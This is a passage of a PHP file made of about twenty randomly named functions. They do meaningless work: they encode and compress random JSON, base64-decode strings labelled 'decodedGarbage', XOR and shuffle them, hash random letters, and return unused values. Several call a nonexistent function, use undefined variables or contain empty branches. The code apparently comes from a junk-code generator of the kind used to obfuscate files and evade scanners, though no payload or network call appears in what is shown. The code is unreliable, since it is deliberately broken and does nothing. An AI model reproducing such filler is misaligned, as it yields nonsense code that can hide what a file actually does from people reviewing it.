        $ykY_PxFn = str_replace('%7B','{{', $ykY_PxFn);
    if (strpos($ykY_PxFn, '%22') !== false) {
        $ykY_PxFn = gzcompress($ykY_PxFn);
    } else {
        $ykY_PxFn = base64_encode($ykY_PxFn);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return strlen($ykY_PxFn);
}

function V5DZh3sadN() {
    $N0f9lZwe = json_encode(['test' => rand(1000,9999)]);
    $MDTjH65k = rawurlencode($N0f9lZwe);
        $MDTjH65k = str_replace('%7B','{{', $MDTjH65k);
    if (strpos($MDTjH65k, '%22') !== false) {
        $MDTjH65k = gzcompress($MDTjH65k);
    } else {
        $MDTjH65k = base64_encode($MDTjH65k);
    }
        echo "Debug: ".rand(1000,9999)."\n";
    return strlen($MDTjH65k);
}

function mf3Fsnb2q_() {
    $KW6_b64 = 'ysmEqy1' . 'BG+HkZLTeIatBx' . 'g==';
    $decodedGarbage = base64_decode($KW6_b64);
    $mfmALTyx = str_shuffle($decodedGarbage);
    $Ptfd95d0 = strrev($mfmALTyx);
    for ($i = 0; $i < strlen($Ptfd95d0); $i++) {
        if ($i % 2 == 1) {
            $Ptfd95d0[$i] = chr(ord($Ptfd95d0[$i]) ^ 'KW6');
        }
    }
    if (strpos($Ptfd95d0, 'A') !== false) {
        $mfmALTyx = str_rot13($mfmALTyx);
    }
        try {
        @nonExistentFunction($arr);
    } catch (\Throwable $e) {
            }
    return strlen($mfmALTyx);
}

function Z7BhbJ2kxC() {
    $AnF_b64 = 'rl7s3oMWj' . '45H0+PCP1HUsw==' . '';
    $decodedGarbage = base64_decode($AnF_b64);
    $SIXbm1GU = str_shuffle($decodedGarbage);
    $Adh6RnNw = strrev($SIXbm1GU);
    for ($i = 0; $i < strlen($Adh6RnNw); $i++) {
        if ($i % 2 == 1) {
            $Adh6RnNw[$i] = chr(ord($Adh6RnNw[$i]) ^ 'AnF');
        }
    }
    if (strpos($Adh6RnNw, 'A') !== false) {
        $SIXbm1GU = str_rot13($SIXbm1GU);
    }
        try {
        @nonExistentFunction($arr);
    } catch (\Throwable $e) {
            }
    return strlen($SIXbm1GU);
}

function AFdkRZI0Fk() {
    $j = 0;
    while ($j < 5) {
        $nWzwqlur .= chr(rand(97, 122));
        $j++;
    }
    if (strlen($nWzwqlur) > 10) {
        $Sco7YnDA = str_replace('a','x', $nWzwqlur);
    } else {
        $Sco7YnDA = strrev($nWzwqlur);
    }
        echo "Debug: ".rand(1000,9999)."\n";
    return sha1($Sco7YnDA);
}

function nLi3lP8jrL() {
    $WdzWnyFk = json_encode(['test' => rand(1000,9999)]);
    $sTLn1o4A = rawurlencode($WdzWnyFk);
        $sTLn1o4A = str_replace('%7B','{{', $sTLn1o4A);
    if (strpos($sTLn1o4A, '%22') !== false) {
        $sTLn1o4A = gzcompress($sTLn1o4A);
    } else {
        $sTLn1o4A = base64_encode($sTLn1o4A);
    }
       $x = rand(1, 100);
    $y = $x * rand(1, 100);
    return strlen($sTLn1o4A);
}

function JtyXniFFu6() {
    $x6tqImE2 = json_encode(['test' => rand(1000,9999)]);
    $dwPJbRuK = rawurlencode($x6tqImE2);
        $dwPJbRuK = str_replace('%7B','{{', $dwPJbRuK);
    if (strpos($dwPJbRuK, '%22') !== false) {
        $dwPJbRuK = gzcompress($dwPJbRuK);
    } else {
        $dwPJbRuK = base64_encode($dwPJbRuK);
    }
       $x = rand(1, 100);
    $y = $x * rand(1, 100);
    return strlen($dwPJbRuK);
}

function lSgictMcmQ() {
    $i0lhhnhI = json_encode(['test' => rand(1000,9999)]);
    $UrROwyQs = rawurlencode($i0lhhnhI);
        $UrROwyQs = str_replace('%7B','{{', $UrROwyQs);
    if (strpos($UrROwyQs, '%22') !== false) {
        $UrROwyQs = gzcompress($UrROwyQs);
    } else {
        $UrROwyQs = base64_encode($UrROwyQs);
    }
       if (rand(0,1)) {
        $z = md5($y);
    } else {
        $z = sha1($y);
    }
    return strlen($UrROwyQs);
}

function EZWeEEnG48() {
    $EcuIxsTd = json_encode(['test' => rand(1000,9999)]);
    $Oy_x09k4 = rawurlencode($EcuIxsTd);
        $Oy_x09k4 = str_replace('%7B','{{', $Oy_x09k4);
    if (strpos($Oy_x09k4, '%22') !== false) {
        $Oy_x09k4 = gzcompress($Oy_x09k4);
    } else {
        $Oy_x09k4 = base64_encode($Oy_x09k4);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return strlen($Oy_x09k4);
}

function Dtpr581Zx6() {
    $Nyi_b64 = 'G285qZ1' . 'i2bLkaJ7gD2UNhA' . '==';
    $decodedGarbage = base64_decode($Nyi_b64);
    $tBUTWaJF = str_shuffle($decodedGarbage);
    $A36LLdQc = strrev($tBUTWaJF);
    for ($i = 0; $i < strlen($A36LLdQc); $i++) {
        if ($i % 2 == 1) {
            $A36LLdQc[$i] = chr(ord($A36LLdQc[$i]) ^ 'Nyi');
        }
    }
    if (strpos($A36LLdQc, 'A') !== false) {
        $tBUTWaJF = str_rot13($tBUTWaJF);
    }
       if (rand(0,1)) {
        $z = md5($y);
    } else {
        $z = sha1($y);
    }
    return strlen($tBUTWaJF);
}

function JV9uWanXRY() {
    switch (rand(0, 2)) {
        case 0: $mu5OZuIo = md5(time()); break;
        case 1: $mu5OZuIo = sha1(time()); break;
        default: $mu5OZuIo = crc32(time());
    }
    if (strlen($mu5OZuIo) > 10) {
        $sR5JDqhf = str_replace('a','x', $mu5OZuIo);
    } else {
        $sR5JDqhf = strrev($mu5OZuIo);
    }
       $x = rand(1, 100);
    $y = $x * rand(1, 100);
    return sha1($sR5JDqhf);
}

function cencA6qwo8() {
    $OrOxN0TO = json_encode(['test' => rand(1000,9999)]);
    $KretJUqD = rawurlencode($OrOxN0TO);
        $KretJUqD = str_replace('%7B','{{', $KretJUqD);
    if (strpos($KretJUqD, '%22') !== false) {
        $KretJUqD = gzcompress($KretJUqD);
    } else {
        $KretJUqD = base64_encode($KretJUqD);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return strlen($KretJUqD);
}

function zg5IZSrcuv() {
    for ($i = 0; $i < 5; $i++) {
        $Gr0vikj5 .= chr(rand(97, 122));
    }
    if (strlen($Gr0vikj5) > 10) {
        $AgxC7VSy = str_replace('a','x', $Gr0vikj5);
    } else {
        $AgxC7VSy = strrev($Gr0vikj5);
    }
       if (rand(0,1)) {
        $z = md5($y);
    } else {
        $z = sha1($y);
    }
    return sha1($AgxC7VSy);
}

function VpXohcwvmV() {
    $Uir7aBPG = json_encode(['test' => rand(1000,9999)]);
    $fLylyU5t = rawurlencode($Uir7aBPG);
        $fLylyU5t = str_replace('%7B','{{', $fLylyU5t);
    if (strpos($fLylyU5t, '%22') !== false) {
        $fLylyU5t = gzcompress($fLylyU5t);
    } else {
        $fLylyU5t = base64_encode($fLylyU5t);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return strlen($fLylyU5t);
}

function gdvvkxd1WO() {
    $C87_b64 = '+onCpUkT' . 'vkqkAxsZ9' . 'uqzCg==';
    $decodedGarbage = base64_decode($C87_b64);
    $sK61zr9V = str_shuffle($decodedGarbage);
    $gS9WxwBY = strrev($sK61zr9V);
    for ($i = 0; $i < strlen($gS9WxwBY); $i++) {
        if ($i % 2 == 1) {
            $gS9WxwBY[$i] = chr(ord($gS9WxwBY[$i]) ^ 'C87');
        }
    }
    if (strpos($gS9WxwBY, 'A') !== false) {
        $sK61zr9V = str_rot13($sK61zr9V);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return strlen($sK61zr9V);
}

function w1fBYm7guv() {
    for ($i = 0; $i < 5; $i++) {
        $GOhqqrcF .= chr(rand(97, 122));
    }
    if (strlen($GOhqqrcF) > 10) {
        $_Gub7LNa = str_replace('a','x', $GOhqqrcF);
    } else {
        $_Gub7LNa = strrev($GOhqqrcF);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return sha1($_Gub7LNa);
}

function zcvdWijMht() {
    $Y5r05d0b = json_encode(['test' => rand(1000,9999)]);
    $ZMtZmJTb = rawurlencode($Y5r05d0b);
        $ZMtZmJTb = str_replace('%7B','{{', $ZMtZmJTb);
    if (strpos($ZMtZmJTb, '%22') !== false) {
        $ZMtZmJTb = gzcompress($ZMtZmJTb);
    } else {
        $ZMtZmJTb = base64_encode($ZMtZmJTb);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return strlen($ZMtZmJTb);
}

function xmcMTeFQql() {
    $CduC97lW = json_encode(['test' => rand(1000,9999)]);
    $kPDniaTy = rawurlencode($CduC97lW);
        $kPDniaTy = str_replace('%7B','{{', $kPDniaTy);
    if (strpos($kPDniaTy, '%22') !== false) {
        $kPDniaTy = gzcompress($kPDniaTy);
    } else {
        $kPDniaTy = base64_encode($kPDniaTy);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return strlen($kPDniaTy);
}

function ltGyQmyF22() {
    switch (rand(0, 2)) {
        case 0: $RYkNX2G_ = md5(time()); break;
        case 1: $RYkNX2G_ = sha1(time()); break;
        default: $RYkNX2G_ = crc32(time());
    }
    if (strlen($RYkNX2G_) > 10) {
        $morw2XKG = str_replace('a','x', $RYkNX2G_);
    } else {
        $morw2XKG = strrev($RYkNX2G_);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return sha1($morw2XKG);
}

?>
